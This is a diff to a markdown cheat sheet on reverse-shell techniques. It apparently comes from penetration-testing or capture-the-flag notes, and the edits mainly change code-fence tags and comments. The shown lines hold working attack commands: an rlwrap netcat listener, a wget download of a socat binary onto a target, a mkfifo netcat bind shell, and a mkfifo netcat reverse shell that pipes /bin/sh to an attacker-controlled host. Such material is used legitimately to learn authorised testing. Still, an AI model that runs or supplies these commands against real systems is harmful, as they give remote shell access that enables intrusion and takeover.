@@ -11,13 +11,13 @@ step 3: stty raw -echo; fg
 ```
 ### Technique 2: rlwrap  
 command: 
-```
-rlwrap nc -lvnp <port>  //background the shell with Ctrl + Z, then use stty raw -echo; fg to stabilise and re-enter the shell
+```bash
+rlwrap nc -lvnp <port>  #background the shell with Ctrl + Z, then use stty raw -echo; fg to stabilise and re-enter the shell
 ```
 ### Technique 3: Socat  
 
 command： 
-```
+```bash
 sudo python3 -m http.server 80
 wget <LOCAL-IP>/socat -O /tmp/socat  //download socat static compiled binary in target 
 
@@ -32,8 +32,8 @@ stty cols numver   //set in shell
 a bit of vague***   
 
 command:  
-```
-mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f   //a bit of hard, but don't worry
+```bash
+mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f   #a bit of hard, but don't worry. try ask chat-gpt
 
 mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
